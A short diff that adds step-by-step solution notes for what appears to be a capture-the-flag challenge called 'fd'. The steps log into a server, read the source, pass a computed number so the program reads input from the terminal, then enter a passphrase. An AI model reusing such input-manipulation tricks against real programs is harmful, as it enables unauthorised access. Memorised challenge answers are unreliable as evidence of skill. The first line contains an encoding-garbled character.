@@ -1,0 +1,4 @@
+1.ssh¨ìserver
+2.cat fd.c
+3../fd `python -c "print 0x1234+1"`
+4.LETMEWIN
